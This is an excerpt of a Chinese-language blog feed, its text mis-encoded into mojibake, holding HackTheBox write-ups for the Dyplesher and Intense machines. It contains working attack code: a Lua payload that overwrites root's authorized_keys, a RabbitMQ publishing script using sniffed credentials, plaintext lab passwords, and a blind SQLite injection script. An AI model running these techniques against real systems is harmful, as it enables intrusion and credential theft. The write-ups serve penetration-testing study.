æœ‰ç‚¹å¤šã€‚é¦–å…ˆé¢˜ç›®é¶æœºå±…ç„¶æ˜¯ä¸é€šå¤–ç½‘çš„ã€‚è¿™ä¸ªæˆ‘çœŸæ²¡æƒ³åˆ°ã€‚å…¶æ¬¡javaé¡¹ç›®å¤§å¤šé…ç½®å¥½äº†ä¸€äº›ç¦æ­¢ç±»ã€‚runtimeå¾ˆæœ‰å¯èƒ½æ˜¯è¡Œä¸é€šçš„ã€‚æ‰€ä»¥æˆ‘é€‰æ‹©ç›´æ¥å†™å…¥webshell(çŒœäº†ä¸€æ‰‹laravelå¯¹åº”çš„å°±æ˜¯htmlæ–‡ä»¶å¤¹è€Œä¸æ˜¯dyplesher.htb)</p><p>æœ€åå®Œæˆåæˆ‘ä»¬ä½¿ç”¨mavenç¼–è¯‘æ‰“åŒ…ã€‚ç›´æ¥åŒå‡»å³è¾¹mavençš„ç”Ÿå‘½å‘¨æœŸä¸­çš„packageå³å¯åˆ›å»ºå¯¹åº”jar file.<br><img src="/2020/07/24/hackthebox-Dyplesher/1.5.5.PNG" class="lazyload" data-srcset="1.5.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å›åˆ°ç½‘é¡µä¸Šä¼ pluginå¹¶ä½¿ç”¨pluginåbyc404 reload.<br><img src="/2020/07/24/hackthebox-Dyplesher/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å†™å…¥webshell.</p><p>ç„¶ååˆ°è¿™ä¸€æ­¥åæ‰çœŸæ­£æ„è¯†åˆ°é¶æœºä¸é€šå¤–ç½‘ã€‚æ‰€ä»¥å¸¸è§„å¼¹shellä¸å¯è¡Œã€‚åªèƒ½å°è¯•å†™å…¥sshå…¬é’¥ã€‚<br><img src="/2020/07/24/hackthebox-Dyplesher/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸç™»é™†ã€‚<br><img src="/2020/07/24/hackthebox-Dyplesher/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†éš¾åº¦å…¶å®è¿˜å¥½ã€‚ä¸»è¦æ—¶é—´éƒ½èŠ±åœ¨çˆ†ç ´å¯†ç ä»¥åŠç¼–å†™javaçš„expæ—¶è¢«ideaçš„æŠ¥é”™ç»™å›°æ‰°äº†ä¸€å°ä¼šä¸Šäº†ã€‚ä½†æ˜¯è€å®è¯´ç¡®å®æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ã€‚æ­£å¥½è®©è‡ªå·±æŠŠåˆšå­¦çš„mavenå·©å›ºäº†ä¸€ä¸‹ã€‚ä¸€ä¸¾ä¸¤å¾—ã€‚</p><h2 id="privesc-to-user"><a href="#privesc-to-user" class="headerlink" title="privesc to user"></a>privesc to user</h2><p>ç®€å•çœ‹ä¸‹useræ–‡ä»¶å¤¹ä¸‹æœä¸å…¶ç„¶è¿˜æœ‰<code>yuntao</code>è·Ÿ<code>felamos</code>ä¸¤ä¸ªç”¨æˆ·</p><p>æ¥ä¸‹æ¥åœ¨ä½¿ç”¨MinatoTWçš„idæ—¶å‘ç°ä¸€ä¸ªé‡è¦ä¿¡æ¯</p><pre><code>uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)</code></pre><p>MinatoTWæ˜¯wiresharkç”¨æˆ·ç»„çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨é¶æœºä¸Šçš„wiresharkæŠ“åŒ…ã€‚ç¡®è®¤äº†ä¸‹ç½‘å¡åº”è¯¥æ˜¯lo.(loä»£è¡¨127.0.0.1ï¼Œå³localhost)</p><pre><code class="bash">tshark -i lo -F pcap -w byc.pcap</code></pre><p>æŠ“ä¸€æ®µæ—¶é—´çš„åŒ…åç”¨wiresharkæ‰“å¼€åˆ†æ.è·Ÿä¸‹tcpæµ</p><p>å¾ˆå¿«å°±èƒ½æŠ“åˆ°å…³é”®ä¿¡æ¯</p><pre><code>AMQPLib.platformS....PHP.versionS....2.11.1.informationS....    copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.basic.nackt..connection.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...EashAnicOc3Op.en_US.</code></pre><p>è¿™ä¸€æ®µä¼¼ä¹æ˜¯AMQPçš„é€šä¿¡å†…å®¹ã€‚å…¶ä¸­æœ‰ä¸€ç»„ç”¨æˆ·å¯†ç <code>yuntao:EashAnicOc3Op</code></p><p>å¹¶ä¸”ç´§æ¥ç€ä¸‹é¢å°±æœ‰å¤šç»„ç”¨æˆ·ä¿¡æ¯ã€‚ä¼¼ä¹æ¥è‡ªäºmc<br><img src="/2020/07/24/hackthebox-Dyplesher/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><pre><code class="json">{&quot;name&quot;:&quot;MinatoTW&quot;,&quot;email&quot;:&quot;MinatoTW@dyplesher.htb&quot;,&quot;address&quot;:&quot;India&quot;,&quot;password&quot;:&quot;bihys1amFov&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;yuntao&quot;,&quot;email&quot;:&quot;yuntao@dyplesher.htb&quot;,&quot;address&quot;:&quot;Italy&quot;,&quot;password&quot;:&quot;wagthAw4ob&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;felamos&quot;,&quot;email&quot;:&quot;felamos@dyplesher.htb&quot;,&quot;address&quot;:&quot;India&quot;,&quot;password&quot;:&quot;tieb0graQueg&quot;,&quot;subscribed&quot;:true}</code></pre><p>ç»æµ‹è¯•å‘ç°è¿™ä¸‰ç»„å¯†ç å‡ä¸ºç³»ç»Ÿç”¨æˆ·å¯†ç ã€‚<br>suåå³å¯åœ¨felamosæ–‡ä»¶å¤¹ä¸‹æ‹¿åˆ°user.txt</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>æ¥ä¸‹æ¥åœ¨felamosæœ‰ä¸€ä¸ªyuntaoçš„æ–‡ä»¶å¤¹ã€‚é‡Œé¢å†™ç€send.sh</p><pre><code class="bash">#!/bin/bashecho &#39;Hey yuntao, Please publish all cuberite plugins created by players on plugin_data &quot;Exchange&quot; and &quot;Queue&quot;. Just send url to download plugins and our new code will review it and working plugins will be added to the server.&#39; &gt;  /dev/pts/{}</code></pre><p>cuberite plugins æ˜¯ä»¥luaè¯­è¨€ç¼–å†™çš„æ’ä»¶ã€‚è€Œè¿™é‡Œçš„ä¿¡æ¯ä¼¼ä¹åœ¨æç¤ºæˆ‘ä»¬å¯ä»¥ç¼–å†™æ¶æ„luaæ’ä»¶æ¥è¿›è¡Œprivesc.å¹¶ä¸”æç¤ºè¯´åªè¦æä¾›luaçš„urlåœ°å€å°±å¯ä»¥å°†æ’ä»¶åŠ å…¥æœåŠ¡ã€‚</p><p>â€œExchangeâ€ and â€œQueueâ€ çš„å«ä¹‰åœ¨æˆ‘è¿›è¡Œäº†ä¸€äº›ç®€å•çš„enumåå‘ç°åº”è¯¥æ˜¯AMQPæ‰€ç”¨åˆ°çš„ã€‚ç”±äºæˆ‘ä»¬ä¸€å¼€å§‹å°±å‘ç°AMQPç«¯å£æ˜¯å¯¹å¤–çš„,è€Œä¸”åˆšåˆšwiresharkæŠ“åˆ°äº†ä¸€ç»„yuntaoçš„è´¦æˆ·è¿˜æ²¡ç”¨ä¸Šã€‚æå¤§å¯èƒ½å°±æ˜¯åˆ©ç”¨amqpå»è¿›è¡Œé€šä¿¡åŠ è½½luaæ’ä»¶ã€‚</p><p>è¿™é‡Œé¶æœºä¸Šè·‘ç€çš„æ˜¯RabbitMQ.è€ŒRabbitMQé»˜è®¤æ˜¯rootæƒé™è·‘çš„ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥åœ¨é¶æœºä¸Šæ‰¾åˆ°è¿è¡Œä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹ä¸€å¥— MQ å®Œæ•´æµç¨‹æ˜¯ä»€ä¹ˆæ ·çš„ï¼š</p><p>é¦–å…ˆå°† RabbitMQ æœåŠ¡å¯åŠ¨</p><p>Producer</p><p>1ã€åˆ›å»ºä¸€ä¸ª connection<br>2ã€åœ¨ connection åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªé¢‘é“ channel<br>3ã€åœ¨é¢‘é“ channel ä¸Šå£°æ˜ä¸€ä¸ª exchangeï¼Œå‚æ•°ä¸º exchange çš„ç±»å‹å’Œåç§°<br>4ã€åœ¨é¢‘é“ channel ä¸Šå‘å¸ƒæ¶ˆæ¯ï¼Œå‚æ•°ä¸º exchange çš„åç§°ä»¥åŠè·¯ç”± (routing_key) ä»¥åŠæ¶ˆæ¯ä½“<br>5ã€å…³é—­ connection</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‰é¢çš„æç¤ºä¸­<code>plugin_data</code>å¯èƒ½å°±æ˜¯è·¯ç”±ã€‚è€Œæˆ‘ä»¬è¦ä¼ é€’çš„æ¶ˆæ¯ä½“å°±æ˜¯luaçš„url.æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨python çš„pikaè¿›è¡Œç¼–å†™</p><pre><code class="python">import pikacreds=pika.PlainCredentials(&#39;yuntao&#39;,&#39;EashAnicOc3Op&#39;)params=pika.Connectionparams(&#39;10.10.10.190&#39;,5672,&#39;/&#39;,creds)conn=pika.BlockingConnection(params)channel = conn.channel()channel.basic_publish(exchange=&#39;&#39;, routing_key=&#39;plugin_data&#39;,body=&quot;http://127.0.0.1:9001/exp.lua&quot;)conn.close()</code></pre><p>ç„¶åå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„luaè„šæœ¬ã€‚ç”±äºluaåå¼¹shellæˆ‘å‘ç°ä¼¼ä¹éƒ½æ˜¯ä¸äº¤äº’çš„ï¼Œæ‰€ä»¥é€‰æ‹©å†™ssh key</p><pre><code class="lua">f=io.open(&quot;/root/.ssh/authorized_keys&quot;, &quot;w&quot;)f:write(&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1dF791Ph8rC/PU4fXFjW4rBuU8JbmozNWx1kll3NA5r/vhpG05UZ/7dl8+Hs+bbnv/4TMferXgPj27QFJNGBuEfM+ZVO9ah5QNTwrO26vlCP885GyO0RoAoFM0ZNQaYfim1j6zrnplgWtJ7rIHRyrxt6ZDCFq7hGQm8CQP1xbVeaYoYYYHAVVt3IxDbeHh5pJsZDNvzsh1RZNCQlLdwvpoDdWhNPYq+lNYWSjGmW9nMVgQzcY1rk2IEf0Cg5NbZyFtBHITEG0myWIEXtg8D+t9f3IZbgzjaXkN4lVbGAGhNHvfrCemrmTWCbfpuoSS7mE65qfo87yVJdxwWYbx47fe0FMGtDBexa/+WyRApN+E/n3D+Dk56bnzSWiWzzxQptxJVPnM+txWOA6aixGb0PJpO1Wa2S29kg1C4GLNaEKXupursO7Vewq4ZCyzQmeWi2g8BljNqjIA89C9v2cRyFx+lIILxwNn2xbjVVf/WYjcE3lXLpqqz2CzCfuR+4xbSU= root@byc404&quot;)f:close()</code></pre><p>åœ¨é¶æœºä¸Šèµ·ä¸ªpythonç›‘å¬9001,ç„¶åkaliè¿è¡Œè„šæœ¬ã€‚çœ‹åˆ°é¶æœºä¸Šè·å–åˆ°luaè„šæœ¬åå°±å¯ä»¥root sshç™»å½•äº†ã€‚</p><p>rooted.<br><img src="/2020/07/24/hackthebox-Dyplesher/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  insaneéš¾åº¦çš„é¶æœºé¦–å…ˆç¡®å®æœ‰ä¸€å®šéš¾åº¦ã€‚ä¸è¿‡æ•´ä½“ä¸Šæˆ‘æ„Ÿè§‰è·Ÿtraveléš¾åº¦å·®ä¸å¤šã€‚ä¸»è¦enumçš„è¿‡ç¨‹æ²¡æœ‰é‚£ä¹ˆæ¯ç‡¥,è€Œåˆ©ç”¨èµ·æ¥çš„éš¾åº¦ä¹Ÿæ²¡é‚£ä¹ˆé«˜ã€‚ä½†æ˜¯æ€»å½’è¿˜æ˜¯å¾ˆæœ‰æ°´å¹³çš„é¶æœºã€‚éœ€è¦æˆ‘ä»¬è€å¿ƒçš„å»æ•´åˆä¿¡æ¯å¹¶å­¦ä¹ æ–°çŸ¥è¯†ã€‚ç¼–å†™mcè·Ÿluaæ’ä»¶éƒ½æ˜¯æé†’æˆ‘ä»¬ä¸è¦ä»»æ„å…è®¸ç”¨æˆ·ä¸Šä¼ è‡ªå®šä¹‰æ’ä»¶ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Intense</title>
      <link href="2020/07/22/hackthebox-Intense/"/>
      <url>2020/07/22/hackthebox-Intense/</url>
      
        <content type="html"><![CDATA[<p>çº ç»“äº†å¥½ä¹…è¦ä¸è¦å†™è¿™ç¯‡wp.æœ€åè¿˜æ˜¯æ‰“ç®—æŠŠæµç¨‹è¿‡ä¸€éå§ã€‚é¦–å…ˆè¿™å°é¶æœºæ²¡æ–™åˆ°çš„æ˜¯å¼€å¼€å¿ƒå¿ƒåšåˆ°rootéƒ¨åˆ†å‘ç°æ˜¯ä¸ªpwnä¸€è„¸æ‡µé€¼ã€‚æƒ³è‡ªå·±ä¸Šæ‰‹æœ€åå‘ç°è¿˜æ˜¯tcl,åªå¥½å»è¯·æ•™æœ‹å‹ã€‚æ‰€å¹¸æœ€åè¿˜æ˜¯æ‰“æˆäº†ã€‚å› æ­¤pwnéƒ¨åˆ†æˆ‘ä¸åšè§£é‡Š,ä¸»è¦æŠŠå‰é¢getshellæµç¨‹å†™ä¸€éã€‚</p><a id="more"></a><p><img src="/2020/07/22/hackthebox-Intense/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>ç¬¬ä¸€éƒ¨åˆ†å…ˆæ˜¯nmapæ‰«æ,å‘ç°åªå¼€äº†22,80ç«¯å£ã€‚é‚£å°±ç›´æ¥ä»webä¸‹æ‰‹ã€‚</p><p>è®¿é—®åˆ°é¡µé¢åå‘ç°æ›´åŠ ç›´æ¥äº†ã€‚é¢˜ç›®ç»™äº†æˆ‘ä»¬å…³é”®ä¿¡æ¯è¯´ç½‘ç«™æ˜¯å¼€æºçš„,ä¸‹è½½src.zipç›´æ¥å¾—appæºç ã€‚é‚£å°±æ„‰å¿«çš„å®¡è®¡äº†ã€‚</p><p>ä¸»ä½“ä»£ç <br>app.py</p><pre><code class="python">from flask import Flask, request, render_template, g, redirect, url_for,\    make_responsefrom utils import get_db, get_session, get_user, try_login, query_db, badword_in_strfrom admin import adminimport sqlite3import lwtapp = Flask(__name__)app.register_blueprint(admin)@app.teardown_appcontextdef close_connection(exception):    db = getattr(g, &#39;_database&#39;, None)    if db is not None:        db.close()@app.route(&#39;/submit&#39;, methods=[&quot;GET&quot;])def submit():    session = get_session(request)    if session:        user = get_user(session[&quot;username&quot;], session[&quot;secret&quot;])        return render_template(&quot;submit.html&quot;, page=&quot;submit&quot;, user=user)    return render_template(&quot;submit.html&quot;, page=&quot;submit&quot;)@app.route(&quot;/submitmessage&quot;, methods=[&quot;POST&quot;])def submitmessage():    message = request.form.get(&quot;message&quot;, &#39;&#39;)    if len(message) &gt; 140:        return &quot;message too long&quot;    if badword_in_str(message):        return &quot;forbidden word in message&quot;    # insert new message in DB    try:        query_db(&quot;insert into messages values (&#39;%s&#39;)&quot; %message)    except sqlite3.Error as e:        return str(e)    return &quot;OK&quot;@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;])def login():    return render_template(&quot;login.html&quot;, page=&quot;login&quot;)@app.route(&quot;/postlogin&quot;, methods=[&quot;POST&quot;])def postlogin():    # return user&#39;s info if exists    data = try_login(request.form)    if data:        resp = make_response(&quot;OK&quot;)        # create new cookie session to authenticate user        session = lwt.create_session(data)        print(session)        cookie = lwt.create_cookie(session)        resp.set_cookie(&quot;auth&quot;, cookie)        return resp    return &quot;Login failed&quot;@app.route(&quot;/logout&quot;)def logout():    resp = make_response(&quot;&lt;script&gt;document.location.href=&#39;/&#39;;&lt;/script&gt;&quot;)    resp.set_cookie(&quot;auth&quot;, &quot;&quot;, expires=0)    return resp@app.route(&quot;/&quot;)@app.route(&quot;/home&quot;)def index():    session = get_session(request)    if session and &quot;username&quot; in session:        user = get_user(session[&quot;username&quot;], session[&quot;secret&quot;])        print(user)        return render_template(&quot;home.html&quot;, page=&quot;home&quot;, user=user)    return render_template(&quot;home.html&quot;, page=&quot;home&quot;)if __name__ == &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,5000)</code></pre><p>admin.py</p><pre><code class="python">from flask import Blueprint, render_template, request, redirect, abortfrom utils import is_admin, admin_view_log, admin_list_logadmin = Blueprint(&#39;admin&#39;, __name__)@admin.route(&quot;/admin&quot;)def admin_home():    if not is_admin(request):        abort(403)    return render_template(&quot;admin.html&quot;)@admin.route(&quot;/admin/log/view&quot;, methods=[&quot;POST&quot;])def view_log():    if not is_admin(request):        abort(403)    logfile = request.form.get(&quot;logfile&quot;)    if logfile:        logcontent = admin_view_log(logfile)        return logcontent    return &#39;&#39;@admin.route(&quot;/admin/log/dir&quot;, methods=[&quot;POST&quot;])def list_log():    if not is_admin(request):        abort(403)    logdir = request.form.get(&quot;logdir&quot;)    if logdir:        logdir = admin_list_log(logdir)        return str(logdir)    return &#39;&#39;</code></pre><p>lwt.py</p><pre><code class="python">from hashlib import sha256from base64 import b64decode, b64encodefrom random import randrangeimport osSECRET = os.urandom(randrange(8, 15))class InvalidSignature(Exception):    passdef sign(msg):    &quot;&quot;&quot; Sign message with secret key &quot;&quot;&quot;    return sha256(SECRET + msg).digest()def verif_signature(data, sig):    &quot;&quot;&quot; Verify if the supplied signature is valid &quot;&quot;&quot;    return sign(data) == sigdef parse_session(cookie):    &quot;&quot;&quot; Parse cookie and return dict        @cookie: &quot;key1=value1;key2=value2&quot;        return {&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}    &quot;&quot;&quot;    b64_data, b64_sig = cookie.split(&#39;.&#39;)    data = b64decode(b64_data)    sig = b64decode(b64_sig)    if not verif_signature(data, sig):        raise InvalidSignature    info = {}    for group in data.split(b&#39;;&#39;):        try:            if not group:                continue            key, val = group.split(b&#39;=&#39;)            info[key.decode()] = val        except Exception:            continue    return infodef create_session(data):    &quot;&quot;&quot; Create session based on dict        @data: {&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}        return &quot;key1=value1;key2=value2;&quot;    &quot;&quot;&quot;    session = &quot;&quot;    for k, v in data.items():        session += f&quot;{k}={v};&quot;    return session.encode()def create_cookie(session):    cookie_sig = sign(session)    print(cookie_sig)    return b64encode(session) + b&#39;.&#39; + b64encode(cookie_sig)</code></pre><p>utils.py</p><pre><code class="python">import lwtimport sqlite3from hashlib import sha256from flask import gfrom os import listdir, pathimport datetimeDATABASE = &quot;database.db&quot;class User:    def __str__(self):        return &quot;User(username=%s,role=%d)&quot; % (self.username,self.role)def get_db():    db = getattr(g, &#39;_database&#39;, None)    if db is None:        db = g._database = sqlite3.connect(DATABASE)    return dbdef log_login(user):    now = datetime.datetime.now()    d = now.strftime(&quot;%Y-%m-%d&quot;)    with open(f&quot;logs/{d}.log&quot;, &#39;a&#39;) as log:        log.write(str(user) + &#39; logged\n&#39;)def badword_in_str(data):    data = data.lower()    badwords = [&quot;rand&quot;, &quot;system&quot;, &quot;exec&quot;, &quot;date&quot;]    for badword in badwords:        if badword in data:            return True    return Falsedef hash_password(password):    &quot;&quot;&quot; Hash password with a secure hashing function &quot;&quot;&quot;    return sha256(password.encode()).hexdigest()def query_db(query, args=(), one=False):    cur = get_db().execute(query, args)    rv = cur.fetchall()    cur.close()    return (rv[0] if rv else None) if one else rvdef get_user(username, secret):    &quot;&quot;&quot; Returns User object if given username/secret exist in DB &quot;&quot;&quot;    username = username.decode()    secret = secret.decode()    res = query_db(&quot;select role from users where username = ? and secret = ?&quot;, (username, secret), one=True)    if res:        user = User()        user.username = username        user.role = res[0]        log_login(user)        return user    return Nonedef try_login(form):    &quot;&quot;&quot; Try to login with the submitted user info &quot;&quot;&quot;    if not form:        return None    username = form[&quot;username&quot;]    password = hash_password(form[&quot;password&quot;])    result = query_db(&quot;select count(*) from users where username = ? and secret = ?&quot;, (username, password), one=True)    if result and result[0]:        return {&quot;username&quot;: username, &quot;secret&quot;:password}    return Nonedef get_session(request):    &quot;&quot;&quot; Get user session and parse it &quot;&quot;&quot;    if not request.cookies:        return     if &quot;auth&quot; not in request.cookies:        return    cookie = request.cookies.get(&quot;auth&quot;)    try:        info = lwt.parse_session(cookie)    except lwt.InvalidSignature:        return {&quot;status&quot;: -1, &quot;msg&quot;: &quot;Invalid signature&quot;}    return infodef is_admin(request):    session = get_session(request)    if not session:        return None    if &quot;username&quot; not in session or &quot;secret&quot; not in session:        return None    user = get_user(session[&quot;username&quot;], session[&quot;secret&quot;])    return user.role == 1#### Logs functions ####def admin_view_log(filename):    if not path.exists(f&quot;logs/{filename}&quot;):        return f&quot;Can&#39;t find {filename}&quot;    with open(f&quot;logs/{filename}&quot;) as out:        return out.read()def admin_list_log(logdir):    if not path.exists(f&quot;logs/{logdir}&quot;):        return f&quot;Can&#39;t find {logdir}&quot;    return listdir(logdir)</code></pre><p>è¿™ä¸ªflaskæºç æ•´ä½“å®ç°äº†sqliteçš„æ•°æ®åº“æŸ¥è¯¢ã€‚åº“ä¸­æœ‰adminè´¦æˆ·ã€‚é€šè¿‡cookieæ¥åˆ¤æ–­admin.å¹¶ä¸”adminæœ‰è¯»æ–‡ä»¶è·Ÿåˆ—ç›®å½•çš„åŠŸèƒ½ã€‚</p><p>é¦–å…ˆä»utils.pyçœ‹èµ·ã€‚è¿™é‡Œçš„å‡½æ•°å…³äºsqliteæ‰§è¡Œéƒ¨åˆ†å‡åšäº†å ä½ç¬¦æŸ¥è¯¢ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ³¨å…¥é—®é¢˜ã€‚<code>def badword_in_str(data)</code>åšäº†å…³é”®å­—çš„ç­›é€‰ã€‚æˆ‘ä»¬å»åˆ°è°ƒç”¨å‡½æ•°çš„åœ°æ–¹,å¾ˆå®¹æ˜“å°±å‘ç°å¤„ç†çš„ä½ç½®<code>/submitmessage</code>å­˜åœ¨insert into å‹çš„sqlæ³¨å…¥ã€‚</p><p>æ³¨æ„æºç ä¸­è¿™é‡Œæ³¨å…¥çš„åœ°æ–¹è¿”å›å€¼æ˜¯ä¸¤ç§ï¼šâ€OKâ€æˆ–è€…æŠ¥é”™ã€‚å¾ˆå¿«å°±èƒ½ååº”è¿‡æ¥æ˜¯sqliteç›²æ³¨,å¹¶ä¸”æ˜¯ä½¿ç”¨æŠ¥é”™å‡½æ•°æ¥åŒºåˆ†å¸ƒå°”å€¼ã€‚</p><p>å…³äºsqliteçš„ç›²æ³¨,æ™®é€šçš„å¸ƒå°”ç›²æ³¨ä¸sqlæ³¨å…¥æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ä½†æ˜¯åœ¨sqlæ—¶é—´ç›²æ³¨çš„æƒ…å½¢ä¸‹å°±éœ€è¦å¦å¤–å¤„ç†ã€‚å› ä¸ºsqliteæ²¡æœ‰å»¶æ—¶å‡½æ•°,æ‰€ä»¥æƒ³è¦åŒºåˆ†åªèƒ½åˆ©ç”¨æŠ¥é”™ã€‚(è¿™ç‚¹åœ¨st98å¤§ä½¬å‡ºçš„sqlite_voting,å‰é˜µå­asisçš„adminpanelä¸­éƒ½å‡ºç°è¿‡) å¸¸ç”¨çš„æŠ¥é”™å‡½æ•°ä¹‹<code>RANDOMBLOB()</code>ä¸å¯ç”¨çš„è¯,è¿˜å¯ä»¥ç”¨<code>abs</code>,<code>json</code>ç­‰å‡½æ•°ã€‚</p><p>è¿™é‡Œç”¨abså‡½æ•°ç®€å•æ„é€ ä¸€ä¸ªdemo</p><pre><code>insert into messages values(&#39;1&#39;) union select abs(-9223372036854775808);=&gt;1&#39;) union select abs(case when (1=1) then (-9223372036854775808) else 0 end) -- </code></pre><p>æœ‰ä¸ªå°ç»†èŠ‚éœ€è¦æ³¨æ„ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯insert intoè¯­å¥çš„é—®é¢˜,å¦‚æœæˆ‘ä»¬åˆ©ç”¨<code>abs(-9223372036854775808)</code>è¿™ä¸ªæ•´ä½“æ¥æ„é€ å¸ƒå°”å€¼çš„è¯ã€‚å½“è¯­å¥ä¸­å‡ºç°selectä¼šä¸€ç›´æŠ¥é”™ã€‚è€Œå¦‚æœæˆ‘ä»¬åˆ©ç”¨<code>-9223372036854775808</code>æ¥ä½œä¸ºçœŸå€¼çš„è¯åˆ™ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚</p><p>ç»¼ä¸Š,ä¸Šé¢è¿™éƒ¨åˆ†å¾ˆå¿«å°±èƒ½ç¼–å†™exp.æœ¬åœ°è·‘çš„è¯,å…ˆå†™ä¸ªsql<br><img src="/2020/07/22/hackthebox-Intense/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å› ä¸ºé¢˜ç›®æºç ä¸­å¾ˆæ˜ç¡®çš„å‡ºç°äº†å‡ ä¸ªåˆ—åï¼Œæ‰€ä»¥å¯ä»¥å¿«é€Ÿç¼–å†™å¹¶åˆ›å»ºæœ¬åœ°çš„db.<br>è¿œç¨‹è·‘</p><pre><code class="python">import requestsimport stringURL =&quot;http://10.10.10.195&quot;flag = &quot;&quot;for i in range(1, 65):    a=0    for j in string.printable:        print(&quot;\r&quot; + flag, flush=False, end=&#39;&#39;)        payload = &quot;a&#39;) union select abs(case when (substr((select password from users limit 0,1),&quot; + str(i) + &quot;,1)=&#39;&quot; + j + &quot;&#39;) then(-9223372036854775808) else 0 end )--&quot;        data = {&#39;message&#39;: payload}        r = requests.post(URL + &#39;submitmessage&#39;, data=data)        if &#39;overflow&#39; in r.text:            a=1            flag += j            print(&quot;\r&quot; + flag, flush=True, end=&#39;&#39;)            break    if a==0:        breakprint(&quot;\r&quot;)return 